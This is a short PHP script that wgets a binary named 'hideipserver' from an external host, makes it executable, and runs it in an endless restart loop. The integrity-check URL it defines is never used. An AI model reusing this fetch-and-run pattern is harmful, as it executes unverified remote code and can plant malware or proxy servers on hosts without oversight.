
<?php

$programurl = "http://verify.instant-e.com/cloude/bin/hideipserver";
$md4url = "http://verify.instant-e.com/cloude/bin/md5.php?filename=hideipserver";
$programname = "./hideipserver";


if(!file_exists($programname))
{
    system("wget $programurl");
    system("chmod a+x $programname");
    
}

$i = 0;
while(1)
{
    $i++;
    echo "Start Server[$i]....\r\n";
    system("./$programname");
    
    Sleep(10);
}


?>